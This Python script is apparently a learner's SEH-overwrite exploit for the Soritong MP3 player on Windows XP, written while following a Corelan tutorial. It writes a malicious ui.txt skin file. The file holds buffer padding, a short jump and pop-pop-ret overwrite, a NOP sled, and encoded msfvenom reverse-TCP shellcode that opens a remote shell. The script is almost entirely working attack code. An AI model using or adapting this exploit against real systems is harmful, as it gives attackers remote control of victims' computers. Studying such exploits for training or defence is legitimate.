#!python
#
# Script Name	: soritong_sploit.py
# Tutorial Link	: https://www.corelan.be (Part 3 SEH Based Exploits)
# Req Modules	: None standard
# Author	: wetw0rk
# Target OS     : Windows XP
# Version	: 1.0
# Python Ver.	: 2.7
# Description	: Following along with corelans SEH exploit guide
#                 this is an exploit for the Soritong MP3 player.
#

import os, struct

# change to the default directory
os.chdir("C:\\Program Files\\SoriTong\\Skin\\Default")
print "[*] evil ui.txt will be written to %s" % (os.getcwd())

file = "ui.txt"					# name of file that will cause exploitation
junk = "A" * 584				# offset to "Next SEH"
NextSEH = "\xeb\x06\x90\x90"			# jump 6 bytes
SEHOverwrite = struct.pack("<L", 0x100116FD)	# pop pop ret from player.dll

padding = "\x90"*10				# NOP sled for our shellcode

# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp
# LHOST=X LPORT=X -f c EXITFUNC=seh -e x86/alpha_mixed --smallest
shellcode = ("\x89\xe7\xda\xc3\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x49\x78\x4f\x72\x37\x70\x77\x70\x33\x30\x71\x70\x4d"
"\x59\x49\x75\x65\x61\x69\x50\x61\x74\x6c\x4b\x72\x70\x66\x50"
"\x6e\x6b\x53\x62\x74\x4c\x6e\x6b\x30\x52\x35\x44\x6e\x6b\x71"
"\x62\x77\x58\x54\x4f\x38\x37\x70\x4a\x44\x66\x64\x71\x49\x6f"
"\x6e\x4c\x65\x6c\x33\x51\x51\x6c\x56\x62\x76\x4c\x51\x30\x4a"
"\x61\x38\x4f\x74\x4d\x63\x31\x4a\x67\x5a\x42\x48\x72\x56\x32"
"\x46\x37\x4c\x4b\x50\x52\x52\x30\x4e\x6b\x43\x7a\x77\x4c\x4c"
"\x4b\x62\x6c\x32\x31\x51\x68\x38\x63\x32\x68\x63\x31\x4b\x61"
"\x32\x71\x6e\x6b\x61\x49\x61\x30\x37\x71\x68\x53\x6e\x6b\x67"
"\x39\x32\x38\x4d\x33\x45\x6a\x30\x49\x6c\x4b\x76\x54\x4e\x6b"
"\x35\x51\x4a\x76\x46\x51\x69\x6f\x6c\x6c\x6a\x61\x4a\x6f\x44"
"\x4d\x45\x51\x4f\x37\x57\x48\x6b\x50\x53\x45\x79\x66\x73\x33"
"\x63\x4d\x38\x78\x35\x6b\x73\x4d\x76\x44\x62\x55\x4d\x34\x36"
"\x38\x6e\x6b\x61\x48\x57\x54\x46\x61\x48\x53\x72\x46\x4c\x4b"
"\x46\x6c\x32\x6b\x4e\x6b\x66\x38\x77\x6c\x37\x71\x69\x43\x4e"
"\x6b\x35\x54\x4c\x4b\x36\x61\x68\x50\x6e\x69\x37\x34\x71\x34"
"\x66\x44\x51\x4b\x51\x4b\x30\x61\x70\x59\x32\x7a\x76\x31\x4b"
"\x4f\x4d\x30\x73\x6f\x71\x4f\x71\x4a\x6e\x6b\x65\x42\x38\x6b"
"\x4c\x4d\x43\x6d\x53\x58\x47\x43\x34\x72\x55\x50\x35\x50\x72"
"\x48\x34\x37\x31\x63\x70\x32\x33\x6f\x72\x74\x30\x68\x52\x6c"
"\x54\x37\x47\x56\x75\x57\x59\x6f\x6b\x65\x38\x38\x6e\x70\x75"
"\x51\x47\x70\x33\x30\x54\x69\x4b\x74\x36\x34\x30\x50\x30\x68"
"\x74\x69\x6d\x50\x42\x4b\x35\x50\x69\x6f\x6a\x75\x73\x5a\x37"
"\x75\x53\x58\x4b\x70\x6d\x78\x4c\x48\x4e\x4c\x45\x38\x75\x52"
"\x57\x70\x75\x50\x36\x62\x4e\x69\x4a\x46\x42\x70\x50\x50\x32"
"\x70\x50\x50\x33\x70\x30\x50\x67\x30\x70\x50\x30\x68\x69\x7a"
"\x34\x4f\x4b\x6f\x6b\x50\x6b\x4f\x6e\x35\x7a\x37\x43\x5a\x52"
"\x30\x72\x76\x66\x37\x43\x58\x4d\x49\x6c\x65\x62\x54\x45\x31"
"\x69\x6f\x38\x55\x4d\x55\x6f\x30\x43\x44\x56\x6c\x39\x6f\x42"
"\x6e\x65\x58\x73\x45\x38\x6c\x53\x58\x6c\x30\x68\x35\x4d\x72"
"\x76\x36\x59\x6f\x59\x45\x53\x5a\x65\x50\x70\x6a\x77\x74\x36"
"\x36\x53\x67\x30\x68\x36\x62\x6b\x69\x78\x48\x31\x4f\x69\x6f"
"\x7a\x75\x4c\x4b\x37\x46\x61\x7a\x33\x70\x72\x48\x65\x50\x72"
"\x30\x63\x30\x63\x30\x32\x76\x50\x6a\x53\x30\x72\x48\x71\x48"
"\x6c\x64\x56\x33\x5a\x45\x49\x6f\x6e\x35\x5a\x33\x46\x33\x51"
"\x7a\x37\x70\x52\x76\x30\x53\x43\x67\x50\x68\x53\x32\x58\x59"
"\x6f\x38\x31\x4f\x39\x6f\x59\x45\x46\x61\x4b\x73\x55\x79\x49"
"\x56\x51\x65\x48\x6e\x69\x53\x41\x41")

junk2 = "\x90"*1000				# junk to append to shellcode

# putting it all together
evil_buffer = junk + NextSEH + SEHOverwrite + padding + shellcode + junk2
# write to file
fd = open(file, 'w')
fd.write(evil_buffer)
